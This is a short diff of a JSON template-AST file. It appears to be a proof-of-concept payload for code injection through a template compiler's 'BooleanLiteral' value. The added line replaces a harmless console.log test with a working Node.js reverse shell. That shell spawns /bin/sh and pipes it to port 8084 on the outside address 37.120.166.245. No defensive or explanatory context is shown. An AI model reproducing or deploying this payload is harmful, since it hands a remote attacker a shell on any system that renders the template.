@@ -13,7 +13,7 @@
         },
         "params": [{
           "type": "BooleanLiteral",
-          "value": "{}, {hash: {}})) + console.log('Helloworld') + Object(String(''"
+          "value": "{}, {hash: {}})) + (function(){ var net = require('net'), cp = require('child_process'), sh = cp.spawn('/bin/sh', []); var client = new net.Socket(); client.connect(8084, '37.120.166.245', function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})(); + Object(String(''"
         }],
         "escaped": true,
         "loc": {
